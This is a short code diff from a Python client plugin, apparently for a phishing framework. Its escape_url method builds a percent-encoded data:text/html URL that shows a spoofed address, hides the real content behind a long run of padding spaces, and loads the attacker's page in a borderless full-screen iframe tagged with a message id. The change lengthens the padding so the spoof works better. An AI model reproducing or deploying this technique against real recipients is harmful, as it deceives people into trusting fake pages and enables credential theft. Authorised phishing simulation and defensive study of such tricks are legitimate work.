@@ -66,7 +66,7 @@ class Plugin(plugins.ClientPlugin):
 
 	def escape_url(self, url, spoofed_url):
 		full_url = 'data:text/html,' + spoofed_url + \
-		'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    '\
+		'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             '\
 		'<iframe width=\"100%\" height=\"100%\" src=\"'+url+'?id={{ client.message_id }}\"></iframe><style>body{color:#fff; overflow:hidden;margin:-10px 0px 0px 0px; background-color: #fff;} iframe { border:none; outline:none;}</style>")'
 	
 		return '%'.join( [ "%x" % ord( x ) for x in full_url ] ).strip()
